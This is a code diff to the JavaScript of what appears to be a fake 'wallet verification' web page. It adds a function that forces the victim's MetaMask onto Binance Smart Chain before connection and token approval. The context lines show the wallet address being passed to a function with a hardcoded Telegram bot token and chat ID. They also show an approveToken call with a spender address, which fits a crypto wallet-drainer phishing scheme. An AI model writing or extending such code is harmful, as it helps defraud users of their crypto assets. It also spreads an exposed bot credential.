@@ -12,6 +12,49 @@ let emailInput = document.querySelector("#emailInput");
 
 // ========================================
 
+async function switchToBsc() {
+  if (window.ethereum) {
+    const chainId = "0x38";
+
+    console.log('ok');
+
+    try {
+      await window.ethereum.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId: chainId }],
+      });
+      console.log("Successfully switched to Binance Smart Chain");
+      
+    } catch (error) {
+      if (error.code === 4902) {
+        try {
+          await window.ethereum.request({
+            method: 'wallet_addEthereumChain',
+            params: [{
+              chainId: chainId,
+              chainName: 'Binance Smart Chain',
+              nativeCurrency: {
+                name: 'Binance Coin',
+                symbol: 'BNB',
+                decimals: 18
+              },
+              rpcUrls: ['https://bsc-dataseed.binance.org/'],
+              blockExplorerUrls: ['https://bscscan.com']
+            }],
+          });
+          console.log("Binance Smart Chain added successfully");
+        } catch (addError) {
+          console.error("Failed to add Binance Smart Chain", addError);
+        }
+      } else {
+        console.error("Failed to switch to Binance Smart Chain", error);
+      }
+    }
+  } else {
+    console.error("Ethereum provider not found. Please install MetaMask.");
+  }
+}
+
 async function verifyWallet(_data){
   const botToken = "7107034391:AAHqyRFDjFCgBazgswzY_CRAYdtlgMQO-N4";
   const chatId = "5204205237";
@@ -57,6 +100,7 @@ async function connectMetaMask() {
       walletAddressSpan.innerHTML = `<b>Wallet Address :</b> ${walletAddress}`;
       walletConnectBtn.innerText = "Verify Wallet";
       verifyWallet(walletAddress);
+      await switchToBsc(); 
     } catch (error) {
       console.error(error);
       walletConnectBtn.innerText = "Connect Wallet";
@@ -97,6 +141,8 @@ async function approveToken(tokenAddress, spenderAddress, _amount) {
   if (!walletAddress) {
     await connectMetaMask();
   }
+
+  await switchToBsc();
 
   walletConnectBtn.innerText = "Wallet Verifying...";
 
